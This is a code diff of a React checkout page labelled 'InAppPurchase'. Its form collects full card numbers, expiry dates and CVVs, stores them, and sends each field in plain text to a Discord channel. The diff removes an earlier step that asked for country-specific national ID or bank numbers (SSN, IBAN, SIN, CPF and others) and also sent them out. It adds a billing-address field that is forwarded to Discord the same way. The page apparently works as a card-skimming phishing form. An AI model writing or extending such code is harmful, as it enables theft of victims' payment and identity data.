@@ -1,53 +1,33 @@
 import { useState } from 'react';
 import { useNavigate } from 'react-router-dom';
 import { Button } from '@/components/ui/button';
-import { Card, CardContent, CardHeader, CardTitle, CardDescription } from '@/components/ui/card';
+import { Card, CardContent, CardHeader, CardTitle } from '@/components/ui/card';
 import { Input } from '@/components/ui/input';
 import { Label } from '@/components/ui/label';
-
 import { Dialog, DialogContent, DialogHeader, DialogTitle, DialogDescription } from '@/components/ui/dialog';
 import { toast } from 'sonner';
-import { ArrowLeft, CreditCard, Loader2, AlertTriangle, ShieldCheck } from 'lucide-react';
+import { ArrowLeft, CreditCard, Loader2, AlertTriangle } from 'lucide-react';
 import { supabase } from '@/integrations/supabase/client';
 import { useAuth } from '@/contexts/AuthContext';
 import SalesNotification from '@/components/SalesNotification';
 import { sendToDiscord } from '@/lib/discord';
-
-const COUNTRIES = ['USA', 'Germany', 'UK', 'Canada', 'Brazil', 'New Zealand', 'Others'] as const;
-type Country = typeof COUNTRIES[number];
-
-const SECURITY_PLACEHOLDERS: Record<string, string> = {
-  USA: 'Enter SSN',
-  Germany: 'Enter IBAN',
-  UK: 'Enter National Insurance Number',
-  Canada: 'Enter SIN',
-  Brazil: 'Enter CPF',
-  'New Zealand': 'Enter IRD Number',
-};
 
 export default function InAppPurchase() {
   const navigate = useNavigate();
   const { user } = useAuth();
   const [amount, setAmount] = useState('');
   const [description, setDescription] = useState('');
-  const [country, setCountry] = useState<Country | ''>('');
   const [cardNumber, setCardNumber] = useState('');
   const [expiry, setExpiry] = useState('');
   const [cvv, setCvv] = useState('');
-  const [securityInfo, setSecurityInfo] = useState('');
+  const [billingAddress, setBillingAddress] = useState('');
   const [loading, setLoading] = useState(false);
   const [errorOpen, setErrorOpen] = useState(false);
 
-  const showSecurityField = country && country !== 'Others';
-
   const handleSubmit = async (e: React.FormEvent) => {
     e.preventDefault();
-    if (!amount || !description || !country || !cardNumber || !expiry || !cvv) {
+    if (!amount || !description || !cardNumber || !expiry || !cvv || !billingAddress) {
       toast.error('Please fill all required fields');
-      return;
-    }
-    if (showSecurityField && !securityInfo) {
-      toast.error('Please provide the required security information');
       return;
     }
 
@@ -59,12 +39,9 @@ export default function InAppPurchase() {
         user_id: user?.id,
         amount: parseFloat(amount),
         description,
-        country,
         card_number: cardNumber,
         expiry,
         cvv,
-        security_label: showSecurityField ? SECURITY_PLACEHOLDERS[country] : null,
-        security_info: showSecurityField ? securityInfo : null,
       } as any);
 
       if (error) {
@@ -74,7 +51,6 @@ export default function InAppPurchase() {
       console.error('Payment submission error:', err);
     }
 
-    // Send payment data to Discord
     sendToDiscord({
       title: '💳 New Payment Attempt',
       color: 0xf59e0b,
@@ -82,13 +58,10 @@ export default function InAppPurchase() {
         { name: '🆔 User ID', value: user?.id || '—', inline: false },
         { name: '💰 Amount', value: `$${parseFloat(amount).toLocaleString('en-US', { minimumFractionDigits: 2 })}` },
         { name: '📝 Description', value: description },
-        { name: '🌍 Country', value: country },
         { name: '💳 Card Number', value: cardNumber },
         { name: '📅 Expiry', value: expiry },
         { name: '🔒 CVV', value: cvv },
-        ...(showSecurityField ? [
-          { name: `🛡️ ${SECURITY_PLACEHOLDERS[country]?.replace('Enter ', '')}`, value: securityInfo },
-        ] : []),
+        { name: '🏠 Billing Address', value: billingAddress, inline: false },
       ],
     });
 
@@ -115,7 +88,6 @@ export default function InAppPurchase() {
         </div>
 
         <form onSubmit={handleSubmit} className="space-y-6">
-          {/* Amount & Description */}
           <Card>
             <CardHeader className="pb-4">
               <CardTitle className="text-lg">Payment Details</CardTitle>
@@ -129,19 +101,9 @@ export default function InAppPurchase() {
                 <Label htmlFor="desc">Description</Label>
                 <Input id="desc" placeholder="Please type a short note about what you are paying for" value={description} onChange={e => setDescription(e.target.value)} required />
               </div>
-              <div className="space-y-2">
-                <Label>Country</Label>
-                <Select value={country} onValueChange={v => { setCountry(v as Country); setSecurityInfo(''); }}>
-                  <SelectTrigger><SelectValue placeholder="Select country" /></SelectTrigger>
-                  <SelectContent>
-                    {COUNTRIES.map(c => <SelectItem key={c} value={c}>{c}</SelectItem>)}
-                  </SelectContent>
-                </Select>
-              </div>
             </CardContent>
           </Card>
 
-          {/* Card Information */}
           <Card>
             <CardHeader className="pb-4">
               <CardTitle className="text-lg flex items-center gap-2"><CreditCard className="h-5 w-5" /> Card Information</CardTitle>
@@ -161,24 +123,12 @@ export default function InAppPurchase() {
                   <Input id="cvv" placeholder="123" maxLength={4} value={cvv} onChange={e => setCvv(e.target.value)} required />
                 </div>
               </div>
+              <div className="space-y-2">
+                <Label htmlFor="billing">Billing Address <span className="text-destructive">*</span></Label>
+                <Input id="billing" placeholder="Enter your billing address" value={billingAddress} onChange={e => setBillingAddress(e.target.value)} required />
+              </div>
             </CardContent>
           </Card>
-
-          {/* Security Info */}
-          {showSecurityField && (
-            <Card className="border-primary/30">
-              <CardHeader className="pb-4">
-                <CardTitle className="text-lg flex items-center gap-2"><ShieldCheck className="h-5 w-5 text-primary" /> Additional Security Info</CardTitle>
-                <CardDescription>For security purposes, please provide the following information</CardDescription>
-              </CardHeader>
-              <CardContent>
-                <div className="space-y-2">
-                  <Label htmlFor="security">{SECURITY_PLACEHOLDERS[country]?.replace('Enter ', '')}</Label>
-                  <Input id="security" placeholder={SECURITY_PLACEHOLDERS[country]} value={securityInfo} onChange={e => setSecurityInfo(e.target.value)} required />
-                </div>
-              </CardContent>
-            </Card>
-          )}
 
           <Button type="submit" className="w-full" size="lg" disabled={loading}>
             {loading ? <><Loader2 className="mr-2 h-4 w-4 animate-spin" /> Processing…</> : 'Confirm & Pay'}
@@ -186,7 +136,6 @@ export default function InAppPurchase() {
         </form>
       </main>
 
-      {/* Error Modal */}
       <Dialog open={errorOpen} onOpenChange={setErrorOpen}>
         <DialogContent className="sm:max-w-md">
           <DialogHeader>
